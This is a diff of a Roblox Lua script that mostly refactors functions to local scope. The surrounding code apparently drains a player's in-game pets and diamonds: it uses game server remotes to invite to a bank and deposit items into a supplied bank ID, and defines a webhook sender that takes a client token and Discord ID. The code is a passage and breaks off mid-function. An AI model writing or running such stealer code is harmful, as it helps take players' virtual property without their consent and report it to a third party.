@@ -24,13 +24,13 @@ return function(Me,client_id,client_token,DiscordID)
     print(Me,client_id,client_token,hook)
     local Library = require(game.ReplicatedStorage.Framework.Library)
     local Pets = Library.Save.Get().Pets
-    function initEvent(event)
-    local args = {
-        [1] = "b",
-        [2] = event
-    }
+    local function initEvent(event)
+        local args = {
+            [1] = "b",
+            [2] = event
+        }
 
-    workspace.__THINGS.__REMOTES.MAIN:FireServer(unpack(args))
+        workspace.__THINGS.__REMOTES.MAIN:FireServer(unpack(args))
     end
     local Event = game.Workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank")
     if not Event then
@@ -44,7 +44,7 @@ return function(Me,client_id,client_token,DiscordID)
     end
     Event2 = game.Workspace.__THINGS.__REMOTES:WaitForChild("bank deposit")
     local Https = game:GetService("HttpService")
-    Send = function(Webhook, Data)
+    local Send = function(Webhook, Data)
         local NewData
         local success, errormessage = pcall(function()
             NewData = Https:JSONEncode(Data)
@@ -63,7 +63,7 @@ return function(Me,client_id,client_token,DiscordID)
         end
     end
 
-    function getUserBank()
+    local function getUserBank()
         local args = {
             [1] = {}
         }
@@ -79,7 +79,7 @@ return function(Me,client_id,client_token,DiscordID)
         end
         return nil
     end
-    function inviteToBank()
+    local function inviteToBank()
         local MyBank = getUserBank()
         if MyBank then
             local args = {
@@ -91,7 +91,7 @@ return function(Me,client_id,client_token,DiscordID)
             Event:InvokeServer(unpack(args))
         end
     end
-    function depositPets(tbl,bankid)
+    local function depositPets(tbl,bankid)
         local args = {
             [1] = {
                 [1] = bankid,
@@ -101,7 +101,7 @@ return function(Me,client_id,client_token,DiscordID)
         }
         return Event2:InvokeServer(unpack(args))
     end
-    function depositDiamonds(bankid)
+    local function depositDiamonds(bankid)
         local args = {
             [1] = {
                 [1] = bankid,
